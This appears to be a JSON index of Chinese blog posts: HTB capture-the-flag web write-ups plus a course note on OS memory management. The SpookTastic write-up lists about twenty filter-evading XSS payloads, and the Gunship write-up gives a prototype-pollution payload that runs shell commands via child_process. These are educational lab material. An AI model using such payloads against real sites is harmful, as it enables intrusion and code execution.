。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"PHP","slug":"PHP","permalink":"https://archer-baiyi.github.io/tags/PHP/"},{"name":"switch","slug":"switch","permalink":"https://archer-baiyi.github.io/tags/switch/"}]},{"title":"HTB SpookTastic Writeup","slug":"CTF/Web/HTB-SpookTastic-Writeup","date":"2025-04-02T21:56:21.000Z","updated":"2025-04-02T22:21:36.823Z","comments":true,"path":"2025/04/02/CTF/Web/HTB-SpookTastic-Writeup/","permalink":"https://archer-baiyi.github.io/2025/04/02/CTF/Web/HTB-SpookTastic-Writeup/","excerpt":"","text":"题目描述 （有附件） 观察打开网页： 翻到最底下可以看到一个输入框： 阅读一下源代码（app.py）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116import random, stringfrom flask import Flask, request, render_template, abortfrom flask_socketio import SocketIOfrom threading import Threadapp = Flask(__name__)socketio = SocketIO(app)registered_emails, socket_clients = [], &#123;&#125;generate = lambda x: &quot;&quot;.join([random.choice(string.hexdigits) for _ in range(x)])BOT_TOKEN = generate(16)def blacklist_pass(email): email = email.lower() if &quot;script&quot; in email: return False return Truedef send_flag(user_ip): for id, ip in socket_clients.items(): if ip == user_ip: socketio.emit(&quot;flag&quot;, &#123;&quot;flag&quot;: open(&quot;flag.txt&quot;).read()&#125;, room=id)def start_bot(user_ip): from selenium import webdriver from selenium.webdriver.chrome.options import Options from selenium.webdriver.chrome.service import Service from selenium.webdriver.support.ui import WebDriverWait from selenium.webdriver.support import expected_conditions as EC host, port = &quot;localhost&quot;, 1337 HOST = f&quot;http://&#123;host&#125;:&#123;port&#125;&quot; options = Options() options.add_argument(&quot;--headless&quot;) options.add_argument(&quot;--no-sandbox&quot;) options.add_argument(&quot;--disable-dev-shm-usage&quot;) options.add_argument(&quot;--disable-infobars&quot;) options.add_argument(&quot;--disable-background-networking&quot;) options.add_argument(&quot;--disable-default-apps&quot;) options.add_argument(&quot;--disable-extensions&quot;) options.add_argument(&quot;--disable-gpu&quot;) options.add_argument(&quot;--disable-sync&quot;) options.add_argument(&quot;--disable-translate&quot;) options.add_argument(&quot;--hide-scrollbars&quot;) options.add_argument(&quot;--metrics-recording-only&quot;) options.add_argument(&quot;--mute-audio&quot;) options.add_argument(&quot;--no-first-run&quot;) options.add_argument(&quot;--dns-prefetch-disable&quot;) options.add_argument(&quot;--safebrowsing-disable-auto-update&quot;) options.add_argument(&quot;--media-cache-size=1&quot;) options.add_argument(&quot;--disk-cache-size=1&quot;) options.add_argument(&quot;--user-agent=HTB/1.0&quot;) service = Service(executable_path=&quot;/usr/bin/chromedriver&quot;) browser = webdriver.Chrome(service=service, options=options) try: browser.get(f&quot;&#123;HOST&#125;/bot?token=&#123;BOT_TOKEN&#125;&quot;) WebDriverWait(browser, 3).until(EC.alert_is_present()) alert = browser.switch_to.alert alert.accept() send_flag(user_ip) except Exception as e: pass finally: registered_emails.clear() browser.quit()@app.route(&quot;/&quot;)def index(): return render_template(&quot;index.html&quot;)@app.route(&quot;/api/register&quot;, methods=[&quot;POST&quot;])def register(): if not request.is_json or not request.json[&quot;email&quot;]: return abort(400) if not blacklist_pass(request.json[&quot;email&quot;]): return abort(401) registered_emails.append(request.json[&quot;email&quot;]) Thread(target=start_bot, args=(request.remote_addr,)).start() return &#123;&quot;success&quot;:True&#125;@app.route(&quot;/bot&quot;)def bot(): if request.args.get(&quot;token&quot;, &quot;&quot;) != BOT_TOKEN: return abort(404) return render_template(&quot;bot.html&quot;, emails=registered_emails)@socketio.on(&quot;connect&quot;)def on_connect(): socket_clients[request.sid] = request.remote_addr@socketio.on(&quot;disconnect&quot;)def on_disconnect(): del socket_clients[request.sid]if __name__ == &quot;__main__&quot;: app.run(host=&quot;0.0.0.0&quot;, port=1337, debug=False) 不难发现2点： 这里 1return render_template(&quot;bot.html&quot;, emails=registered_emails) 会接收我们的输入并且直接插入 bot.html 里，而查看 bot.html ： 123&#123;% for email in emails %&#125; &lt;span&gt;&#123;&#123; email|safe &#125;&#125;&lt;/span&gt;&lt;br/&gt;&#123;% endfor %&#125; 会发现它会直接将我们的输入不进行过滤直接插入进模板里，所以注入是可行的。 唯一的一点小阻拦是这里： 1234567def blacklist_pass(email): email = email.lower() if &quot;script&quot; in email: return False return True 我们输入的内容不能包含”script”。 通过这段： 12345678try: browser.get(f&quot;&#123;HOST&#125;/bot?token=&#123;BOT_TOKEN&#125;&quot;) WebDriverWait(browser, 3).until(EC.alert_is_present()) alert = browser.switch_to.alert alert.accept() send_flag(user_ip) 可以确定只要我们可以成功触发alert就可以得到flag。 渗透我们需要做的就是不构造包含”script”的注入触发alert，方法有很多种（每一行都是可行的）： 1234567891011121314151617181920212223242526272829&lt;img src=x onerror=alert(1)&gt;&lt;img src=x onerror=&amp;#x61;lert(1)&gt;&lt;img src=1 onerror=confirm(1)&gt;&lt;img src=a onerror=prompt(1)&gt;&lt;svg onload=alert(1)&gt;&lt;svg onload=&amp;#97;lert(1)&gt;&lt;svg oNlOaD=alert(1)&gt;&lt;svg/onload=alert(1)&gt;&lt;svg onload=/*x*/alert(1)&gt;&lt;img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))&gt;&lt;svg onload=prompt(1)&gt;&lt;svg&gt;&lt;animate attributeName=x dur=1s onend=alert(1)&gt;&lt;video&gt;&lt;source onerror=alert(1)&gt;&lt;/video&gt;&lt;iframe onload=alert(1)&gt;&lt;iframe srcdoc=&quot;&lt;svg onload=alert(1)&gt;&quot;&gt;&lt;/iframe&gt;&lt;details open ontoggle=alert(1)&gt;X&lt;/details&gt;&lt;math&gt;&lt;mtext&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/mtext&gt;&lt;/math&gt;&lt;/span&gt;&lt;svg onload=alert(1)&gt;&lt;/span&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/span&gt;&lt;iframe onload=alert(1)&gt;&lt;/span&gt;&lt;video&gt;&lt;source onerror=alert(1)&gt;&lt;/video&gt; 点击后就会显示： 得到flag：HTB{al3rt5_c4n_4nd_w1l1_c4us3_jumpsc4r35!!} 。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://archer-baiyi.github.io/tags/JavaScript/"},{"name":"XSS","slug":"XSS","permalink":"https://archer-baiyi.github.io/tags/XSS/"},{"name":"html","slug":"html","permalink":"https://archer-baiyi.github.io/tags/html/"}]},{"title":"GBS 6 Speicherverwaltung 内存管理","slug":"TUM info 笔记/GBS/GBS-6-Speicherverwaltung-内存管理","date":"2025-04-02T20:20:04.000Z","updated":"2025-04-26T18:31:05.713Z","comments":true,"path":"2025/04/02/TUM info 笔记/GBS/GBS-6-Speicherverwaltung-内存管理/","permalink":"https://archer-baiyi.github.io/2025/04/02/TUM%20info%20%E7%AC%94%E8%AE%B0/GBS/GBS-6-Speicherverwaltung-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/","excerpt":"操作系统基础相关笔记","text":"Einführung首先来看一下计算机存储的层次结构： 从上往下依次是寄存器、缓存、内存、硬盘以及磁带驱动器。存储空间大小（从上往下）依次递增，但读取速度依次递减。 我们这章主要关注内存（Hauptspeicher）。 物理内存管理假如所有程序可以完全访问整个物理内存，那么每个程序都有可能占用整个主内存，甚至可能覆盖掉系统内存区域，导致系统崩溃。包括程序直接也可能会相互干扰。所以我们希望给每个进程分配独立的存储空间。 寻址（Adressierung）而为了更好地管理物理地址空间（Physischer Adressraum），我们会从中抽象出逻辑地址空间（Logischer Adressraum），然后通过内存映射（Speicherabbildung，Memory Address Translation）将逻辑地址转换成实际的物理地址。这种内存映射也叫做寻址（Adressierung）。 寻址方式一般有3种： 直接寻址（Direkte Adressierung）这种寻址的映射相当于是 $f = id$ 。图示： 但一旦有多个程序运行的话，我们会碰到以下问题： 大量交换（Extensives Swapping） 在某一时刻一定是只有一个程序在运行并且使用内存空间，所以当操作系统想要切换运行的程序时，需要把当前运行程序的内存内容保存到硬盘，然后从硬盘加载下一个程序到内存中。 这样会导致效率极其低下（或者说非常慢）。 重定位（Relokation） 由于程序可以被加载到内存的不同位置，所以每次重新分配地址时需要改写（重定位）所有的地址，会非常的麻烦。（可以看下面举的例子） 基址寻址（Basis-Adressierung）每一个进程会得到一个基址（Basisadresse）$b_x$ ，这个进程的所有地址都是基于这个基址的一个相对地址。 图示： 举个例子区分一下基址寻址（Basis-Adressierung）和直接寻址（Direkte Adressierung）：假设我们现在的内存空间有15个Block，并且有2个程序在使用内存，我们将1-5分给第一个程序，把6-10分给第二个程序。如果是直接寻址的话，第一个程序的地址需要记录成（1，2，3，4，5），第二个需要记录（6，7，8，9，10）。但如果是基址寻址的话，第二个只需要记录（5；1，2，3，4，5），主要会记录相对位置。这样一来在重新分配内存空间时只需要修改basis（也就是5）即可（比如说（10；1，2，3，4，5）），其他的不需要改变。 当然基址寻址（Basis-Adressierung）也有个缺点，那就是每次计算地址时都需要进行一次加法操作。（Aufwendige Additionsoperation） 段式寻址（Segmentadressierung）将Adressraums分成不同长度的逻辑段（logische Segmente），比如说分成Stack-, Daten-, Code-Segment。这样做的好处是可以给每一段内容不同的权限（Zugriffsberechtigungen），以提高安全性，针对pwn的攻击特别有用。 每个段需要两个基本信息：段起始地址（Segmentanfangsadresse）和段的长度（Länge des Segments）。 CPU通常提供一个段寄存器（Segmentregister）来保存段信息。 只不过主要是32 位操作系统会使用段机制，而在64 位系统中基本不用段机制，最多用于线程管理（TLS）和兼容性支持。 我们来看一下x86里的段式寻址（Segmentadressierung）的例子： x86 架构会使用一个叫做全局描述符表（Global Descriptor Table, GDT）的数据结构来管理段，每一项会包含以下信息： 基地址（Basisadresse） 段的长度（Länge des Segments） 标志位（Flags）：例如Zugriff以及Segment的类型（Code，Daten还是Stack） 而段寄存器（Segmentregister）中保存的不是地址，而是GDT表中的一个索引。 1. 想要访问 cs:0x800 的话，需要先在段寄存器（Segmentregister）找到cs对应的值，也就是 0x08，然后找到这个值在DGT对应的那一行信息。随后计算 0x10000 + 0x800 = 0x10800。确认它在范围内，所以这个就是我们要的地址。 2. 想要访问 es:0x800 的话，需要先在段寄存器（Segmentregister）找到es对应的值，也就是 0x10，然后找到这个值在DGT对应的那一行信息。随后计算 0x20000 + 0x800，会发现超出范围了，因为它的长度只有 0x00800，所以会返回 “Segmentation Fault”。 空闲内存管理（Freispeicherverwaltung）存储结构位图（Bitmap）将存储空间分成相同大小的块（Blöcke），每个块用一个bit标记，1表示已占用，0表示空闲。这一串内容就是位图（Bitmap）。 例子： 但是实现过程中会遇到一个问题：Blcok的大小该怎么选择呢？选小了就会需要更大位图，但选大了又容易导致浪费。 优势： 可以简单快速地访问固定大小的内存块。 缺点： 假如有个进程需要k个Block，那么就需要在位图里找到7个连续的0，这个的开销就太大了。 链表（Verkettete Liste）还是将存储空间分成相同大小的块（Blöcke），然后链表记录块的占用信息： 链表的每一项存储： 开始地址 长度 指向下一项的指针（einen Zeiger auf den nächsten Eintrag (oder Terminator T == NULL)） 例子： P表示已被进程占用，F表空闲。 优点： 灵活（Flexible Speicheraufteilung） 缺点： 需要线性搜索（Lineare Suche） 需要挨个找有没有合适的。 没有固定的管理结构 优化的办法： 分别维护两个链表，一个存储已分配的内存块，一个存储空闲的内存块。 按照内存块大小排序 使用平衡树结构管理链表（(balancierter) Baumstruktur） 同时使用多个链表 内存分配策略（Belegungstrategien）由于需要一直分配再释放进程的存储空间，所以存储空间容易碎片化。比如说在上面那张图里有着好几个空闲的连续的存储空间，我们该如何给每个进程选择一块合适的位置呢？ 一般会用到以下几个策略： （以这个为例:） First-Fit从前往后，找到大小够的直接给。 Next-Fit从上次停止的地方开始，找到够的直接给。 Best-Fit分配“最小剩余空间”的空闲块（Freibereich mit dem geringsten Verschnitt） Worst-Fit分配“最大剩余空间”的空闲块（Freibereich mit dem größten Verschnitt） Buddy-Algorithmus将存储空间分成 $2^k$ 大小的Block，where $l \\leq k \\leq u$，$2^l$是最小的可占用的空间大小，$2^u$是最大的可占用的空间大小。当一个进程需要的存储空间为 $x$ 时，会给它分配一块大小为 $2^{\\lfloor log_2(x) \\rfloor}$ 的Block。 这样一来每次最多会浪费半个Block大小的存储空间。 分配的具体算法看这个例子就好：（需要额外注意它合并空闲块的算法） 碎片化（Fragmentierung）一般会分成内部碎片与外部碎片。 内部碎片（Interne Fragmentierung）：在按块分配内存时，通常会分配多于实际所需的内存。这部分多余的内存区域既不能被当前进程使用（内部），也不能被其他进程使用（外部）。也就是会产生很多碎片（Verschnitt）。这些多余的部分就被叫做内部碎片。 例如Buddy-Algorithmus主要带来的便是内部碎片。它给每个进程分配了一个Block之后，这个Block里多余的部分是不会分配给其他进程的。 外部碎片（Externe Fragmentierung）：由于创建和释放内存块的动态变化，会在主存中产生空洞（Löcher）。即使总的空闲内存量是足够的，也可能没有一个足够大的连续内存区域来满足一个请求。这些空闲内存就被叫做外部碎片。 比如说使用Best-Fit策略，就会剩下来很多小的不连续的空闲块。 虚拟内存管理（Virtuelle Speicherverwaltung）一般情况下，进程的虚拟地址空间是大于实际可用的物理内存的。所以我们同样需要管理虚拟内存，以决定将哪些部分加载到（物理的实际）内存中。 最常用的实现方式便是分页（Paging）： 将虚拟地址空间被划分为页面（Seiten，Pages），内存（Hauptspeicher）被划分为物理页框（Kacheln，Frames）。通常每一页和每个页框的大小相同，或者至少页的大小是页框大小的倍数。 操作系统需要做的便是将页面映射到页框（Abbilden von Seiten auf Kacheln）。 这个映射具体由内存管理单元（Memory Management Unit，MMU）完成。 Paging中三个重要概念：（下面会详细讲） 页表（Page Table）： 负责管理虚拟页与物理页框之间的映射关系，操作系统为每个进程维护一张页表。 缺页异常（Seitenfehler，Page Fault）： 当访问一个尚未被加载到内存的虚拟页时，就会产生一个页错误（Page Fault），硬件会发出一个中断信号。操作系统响应这个中断，把缺失的页从磁盘加载到内存 页面换入（Seiteneinlagerung）： 如果内存已满，则需要将已有的页移出（换出）来腾出空间，被换出的页会被保存到硬盘中。 流程： 程序访问虚拟页 → 检查页表 → 若页不在内存 → 触发页错误（Page Fault） → OS 调入页面 → 若内存满 → 页面置换 → 更新页表 → 继续执行 硬件组件如之前提到的，内存管理单元（Memory Management Unit，MMU）负责完成地址的映射。 它的工作流程如图： CPU 发送虚拟地址（VA）给 MMU MMU 根据虚拟地址确定 Page Table Entry 的地址（PTEA） MMU 从缓存或内存中读取页表项（PTE） MMU 根据页表项计算出物理地址（PA） 缓存/内存将物理地址对应的数据（Daten）发送回 CPU 但这样会带来一个问题：由于页表通常存放在主存中，所以地址转换（Adressabbildung）的开销会非常大。 因此可以利用缓存（Cache）来改善这个问题：地址转换后备缓冲区（Translation Lookaside Buffer，TLB），它负责存储近期访问过的页表项（Page Table Entry）。 流程： CPU 发送虚拟地址 VA MMU 提取出虚拟页号 VPN，查询 TLB 如果 TLB 命中（TLB Hit），直接获得页表项（PTE） MMU 根据 PTE 生成物理地址（PA） 数据从物理内存中返回到 CPU 没有 Hit 的情况叫做 TLB Miss，会需要一次额外的内存访问来加载页表项（PTE）： 页表（Page Table）一个虚拟地址 v 会被解释为v=(s,w)，其中s表示页号（Seitenummer），w表示偏移量（Offset）。 每一页都对应一个页表项（1 Page-Table-Eintrag pro Seite），而这个页表项里会存储页框号（Frame-Nummer）。在转换地址时，s会被直接转换成页框号（Frame-Nummer），然后和w拼起来组成真正的物理地址。如图： 具体的转换过程可以看文章末尾的相关例题。 而页表中除了地址，还会存储附加信息，通过单个位（Bit）来表示： P（present）位：是否存在 表示对应的物理地址是否存在/有效 U/S（user/supervisor）位：用户/内核模式访问控制 指示是否只有操作系统内核（Betriebssystemkern）可以访问该页面 R（referenced）/ A（accessed）位：是否被访问过 只要这个页面被访问（zugegriffen），CPU就会自动设置这一位（为1）。 M（modify）/ Dirty Bit：是否被修改过 只要这页里有至少一个字节被写入（geschrieben），CPU就会自动设置这一位（为1）。 XD（execute-disable）位：禁止执行位 表示该页是否允许执行指令。属于保护措施。 多级页表（Mehrstufige Seitentabellen）如果虚拟地址空间很大，那么相应的页表（Page Table）也非常大，意味着将整个页表放入内存会占用大量内存资源。 所以需要引入多级页表结构，每一级页表只负责一部分地址空间，按需加载。 页错误（Seitenfehler，Page Fault）当程序访问一个虚拟地址时，如果该地址对应的页面不在内存中（即页表中的 P-Bit 未设置），就会发生页错误（Seitenfehler，Page Fault）。硬件会触发中断（Interrupt），交由操作系统处理，执行页错误处理器（Page-Fault-Handler）。 处理时分2种情况： 页面被换出（ausgelagert）： 查找是否有空闲页框（Kachel）： 有空闲：直接加载页面 无空闲：使用页面置换算法（Seitenersetzungsstrategien）释放空间 页面不存在也未被换出（nicht ausgelagert） 操作系统会触发内存保护错误（Speicherschutz-Fehler） 之后便会更新页表项（Page-Table-Eintrag）：设置P-Bit，清除R-Bit和M-Bit。 这些操作都完成之后便会恢复程序的状态。 目前这些转换地址的流程总结一下就是： 页面置换算法（Seitenersetzungsstrategien）替换页面的时候，我们有3个问题需要考虑：当内存满了，我们应该 在什么时候加载页面？ 针对这个问题我们有2种方法： 按需分页（On-Demand Paging）：页面只有在确实被访问到时，才会被加载到主存。 预取（Prefetching）：会提前加载页面以备不时之需。但这样一来又会回到一开始的问题，我们需要在提前多久加载哪些内容呢？ 将页面加载到哪里？ 所有页框（Kacheln）地位相同，一般不需要策略决定。但在实际中操作系统一般会对内核代码和内核数据做特殊处理，比如说恒等映射（Identity Mapping），即虚拟地址 = 物理地址。这样效率会高很多。 如果内存已经满了，我们该把现有的哪一页给换下去？ 这些正是我们下面会仔细讲的内容。 理论上最完美的算法当然是替换掉那个 下一次将被访问时间最晚 的页面。操作系统肯定是无法做到预知未来的，不过我们可以尝试往这个方向靠。 FIFO跟普通的First-in-First-Out一样，先替换掉最早来的。 例子： 缺点：在实际情况里大部分最早来的都是最重要的，所以之后大概率会多次访问，如果被替换下去了会一直触发Page Fault，开销会很大。 所以相比之下较常用的是它的改版：Second-Chance-Algorithmus。 Second-Chance-Algorithmus在FIFO的基础上，会给每页第二次机会。 页面被访问时会设置R-bit = 1。如果在队伍首则判断R-Bit的值，等于0就会被替换掉（如果M=1需要先执行写入操作然后再替换），等于1的话就给R-Bit的值更新成0然后挪到队伍尾。 图示： 缺点：每次都移动整个队列非常麻烦。 所以使用更高效的数据结构替代队列：Clock。 Clock-Algorithmus将所有页面按顺序组成一个环状列表（就像Clock一样），有一个“时钟指针”指向其中某个页面，表示当前检查的位置。这个指针用于寻找要替换的页面。 具体流程： 如果当前指向的页面的 R 位为 0： 替换这个页面为新页面 指针移动一格（顺时针） 如果 R 位为 1： 将 R 位清除（设为 0） 指针继续移动一格，检查下一个页面 重复 1-2 步骤： 直到找到一个 R 位为 0 的页面 这个页面会被替换 如果该页面的 M 位（Modified Bit）为 1： 将该页面内容写回磁盘 如果 M 位为 0： 直接丢弃该页面（因为它未被修改） 具体例子见文章结尾的例题。 Clock 例子： 假设现在需要进行这些操作： 那么：（每一步里被修改了的内容都用橙色标出来了的） Least Recently Used (LRU)因为程序的局部性原理（Lokalitätseigenschaft），我们可以假设过去经常使用的页面，未来也可能被再次使用。 当发生Page Fault时，替换掉那个“最长时间没被使用”的页面。 缺点：这个方法的实现需要一个双向链表，记录所有被访问页面，每次访问页面都要把它移到表头（意味着频繁更新），开销太大了，效率不高。 不过我们可以考虑使用软件近似模拟LRU（用“近似但效率更高”的方法来模拟 LRU 的行为趋势）：Not Frequently Used (NFU) 和 Aging。 LRU例子： 假设现在有6页（Page）和4个页框（Kacheln），我们想要按照这个顺序访问：1 3 5 4 2 4 3 2 1 0 5 3 ，那么具体的过程便是： Not Frequently Used (NFU) 给每个页面 P 引入一个软件计数器 $A_p$ 固定大小，例如 b 位（bit），初始为 0 每次定时器中断（Timer-Interrupt）时： 操作系统检查所有页面的 R 位（被访问位） 如果某个页面 P 的 R 位被设置： 对应的计数器 $A_p$ 加 1 缺点：NFU并不知道“访问是否是最近的”，只知道总访问次数。比如说一个页面过去访问很多，但最近一直没被访问，NFU仍然会认为它很重要。 为了解决这个问题便需要Aging-Verfahren。 NFU 例子1： 页面编号：0, 1, 2, 3, 4 访问顺序（参考链）：0111221123324434 得到的计数器值：$A_0=1, A_1=5, A_2=4, A_3=3, A_4=3,$ NFU 例子2： 假设现在有6页（Page）和4个页框（Kacheln），我们想要按照这个顺序访问：1 3 5 4 2 4 3 2 1 0 5 3 ，那么具体的过程便是： Aging-VerfahrenAging主要的思路是记录访问的“老化”程度（Erfassung der Alterung von Zugriffen）。 首先设置一个固定时间间隔 t（比如 20 毫秒）并记录哪些页面在这个间隔内被访问了。 同样会给每个页面 P 引入一个软件计数器 $A_p$。 每隔 t 的时间都会更新$A_p$： 将计数器向右移一位（shift） 把当前 R 位的值放到最高位 Aging 例子： 假设：Aging 计数器为 4 位（二进制），当前计数器 $A_p = 1100_2 = 12_{10}$，当前的引用位 R = 0。 那么新的 $A_p$ 会变成 $0110_2 = 6_{10}$ 。 当然，Aging也是有一定局限性的，但是我没看懂。（乐） Working-Set Ersetzungs-Verfahren前面这些策略全都是基于按需分页（Demand Paging）的，我们现在来看点不一样的。 首先，一个进程当前真正需要的那一批页面（Die Menge der Seiten, die ein Prozess aktuell benötigt）称为：工作集（Working Set）。而抖动（Setitenflattern，Thrashing）指的是当进程频繁地触发Page Fault。 在Working-Set-Modell中： 在任意时刻 t，工作集 w(k, t) 表示进程在最近的 k 次内存访问中访问到的页面集合。（从t往前数k个） 比如说给定一个访问序列：26157777516234123444344，并且将k设置为4，那么w(k, t1) = {3, 4}，w(8, t1) = {2, 3, 4}。 最简单的办法肯定是只替换不在当前工作集内的页面，但是每次都往前追踪k次访问带来的开销太大了。所以我们使用进程的执行时间（Rechenzeit）来近似。 需要先定义几个值： 执行时间区间 $\\tau$ 时间间隔 I（Clock Tick 间隔） 给每个进程设置一个单调递增的计数器 $Z$，用于近似进程的执行时间（Ausführungszeit /Rechenzeit)，实际使用CPU的时间） 给每一页 P 设置一个计数器 $Z_p$，用于近似上次访问的时间。 Working-Set Ersetzungs-Verfahren： 当发生页面错误时，操作系统会检查所有页的 R 位（R-Bits）： 如果R=1 für Seite P：页面属于 Working-Set，不会被替换，但是会将当前的 $Z_p$ 更新成 $Z$ 的值； 如果R=0 für Seite P： 如果$Z - Z_P &gt; \\tau$：P不属于Working-Set，会被替换掉； 如果$Z - Z_P \\leq \\tau$：虽然 P 在 I 这段时间里没有被使用过，但还是属于 Working-Set。 如果找到了多个符合条件的候选页：系统会选择 $Z_p$ 最小的那一页，称为 $P_{\\text{old}}$。 如果找不到任何页面可以换出（所有页面都还在 Working Set 中）：替换最老的页面（即 $P_{\\text{old}}$）。 缺点：实现起来非常复杂。 所以实际中会用 Working-Set Ansatz mit Clock-artiger Verwaltung der Seiten。 Working Set with Clockmalloc()Linux中的内存管理使用4级页表（4-stufige Pagetabelle）。 内存分配（Speicher-Allokation）： Buddy 分配器（Buddy-Allocator，基于之前讲的Buddy-Algorithm）：最小分配单位为页（page） 页面替换策略（Seitenersetzungsstrategie）： 使用 Swap 区：页不会立即被换出，而是暂存在 Swap 区 操作系统会保留一部分空闲帧（Frames），以便快速加载需要的页面 使用 Clock 替换算法的一个变种 作为页面替换策略 例题","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM-info-课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"操作系统","slug":"操作系统","permalink":"https://archer-baiyi.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"内存管理","slug":"内存管理","permalink":"https://archer-baiyi.github.io/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"},{"name":"Paging","slug":"Paging","permalink":"https://archer-baiyi.github.io/tags/Paging/"},{"name":"Page table","slug":"Page-table","permalink":"https://archer-baiyi.github.io/tags/Page-table/"},{"name":"Ersetztungsstrategie","slug":"Ersetztungsstrategie","permalink":"https://archer-baiyi.github.io/tags/Ersetztungsstrategie/"}]},{"title":"HTB Gunship Writeup","slug":"CTF/Web/HTB-Gunship-Writeup","date":"2025-04-02T18:13:43.000Z","updated":"2025-04-02T21:31:57.706Z","comments":true,"path":"2025/04/02/CTF/Web/HTB-Gunship-Writeup/","permalink":"https://archer-baiyi.github.io/2025/04/02/CTF/Web/HTB-Gunship-Writeup/","excerpt":"","text":"题目描述 （有附件） 观察打开网页： 查看源码： 12345678910111213141516171819202122232425const path = require(&#x27;path&#x27;);const express = require(&#x27;express&#x27;);const pug = require(&#x27;pug&#x27;);const &#123; unflatten &#125; = require(&#x27;flat&#x27;);const router = express.Router();router.get(&#x27;/&#x27;, (req, res) =&gt; &#123; return res.sendFile(path.resolve(&#x27;views/index.html&#x27;));&#125;);router.post(&#x27;/api/submit&#x27;, (req, res) =&gt; &#123; const &#123; artist &#125; = unflatten(req.body); if (artist.name.includes(&#x27;Haigh&#x27;) || artist.name.includes(&#x27;Westaway&#x27;) || artist.name.includes(&#x27;Gingell&#x27;)) &#123; return res.json(&#123; &#x27;response&#x27;: pug.compile(&#x27;span Hello #&#123;user&#125;, thank you for letting us know!&#x27;)(&#123; user: &#x27;guest&#x27; &#125;) &#125;); &#125; else &#123; return res.json(&#123; &#x27;response&#x27;: &#x27;Please provide us with the full name of an existing member.&#x27; &#125;); &#125;&#125;);module.exports = router; 发现它使用了 pug 模板引擎，是专门用来生成 HTML的。 使用Burpsuit抓包可以发现网页给 /api/submit 发送的是： 渗透这段代码里一开始引用的 unflatten() 正是漏洞所在。 （具体攻击原理参考 https://rayepeng.medium.com/how-ast-injection-and-prototype-pollution-ignite-threats-abb165164a68） 将发送的内容改成（放到Repeater里修改了再发送）： 123456789&#123; &quot;artist.name&quot;: &quot;Haigh&quot;, &quot;__proto__&quot;: &#123; &quot;block&quot;: &#123; &quot;type&quot;: &quot;Text&quot;, &quot;line&quot;: &quot;console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cp /app/flag* /app/static/flag&#x27;).toString())&quot; &#125; &#125;&#125; 这个内容经过 unflatten() 的处理后会变成： 123456789&#123; artist: &#123; name: &quot;Haigh&quot; &#125;, __proto__: &#123; block: &#123; type: &quot;Text&quot;, line: &quot;console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cp /app/flag* /app/static/flag&#x27;).toString())&quot; &#125; &#125;&#125; 这里的__proto__ 会污染 所有对象的原型，让所有对象都拥有 .block 这个属性。 这段代码最终干的事情便是： 1cp /app/flag* /app/static/flag 会将flag的内容复制到 /app/static/flag 目录下，然后我们直接访问 1http://83.136.249.227:44133/static/flag 便可下载文件然后得到flag：HTB{wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!} 。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"注入","slug":"注入","permalink":"https://archer-baiyi.github.io/tags/%E6%B3%A8%E5%85%A5/"},{"name":"RCE","slug":"RCE","permalink":"https://archer-baiyi.github.io/tags/RCE/"}]},{"title":"HTB WayWitch Writeup","slug":"CTF/Web/HTB-WayWitch-Writeup","date":"2025-04-02T16:03:54.000Z","updated":"2025-04-02T21:32:28.368Z","comments":true,"path":"2025/04/02/CTF/Web/HTB-WayWitch-Writeup/","permalink":"https://archer-baiyi.github.io/2025/04/02/CTF/Web/HTB-WayWitch-Writeup/","excerpt":"","text":"题目描述 （有附件） 观察打开网页： 输入123试试，然后查看cookie： 因为cookie的内容为3部分，每2部分由 . 隔开的，所以是JWT，用 https://jwt.io/ 试试： 去给的附件里找找看有没有关于JWT的信息。 运气比较好，通过直接搜索 “JWT” 可以在 scr/views/index.html 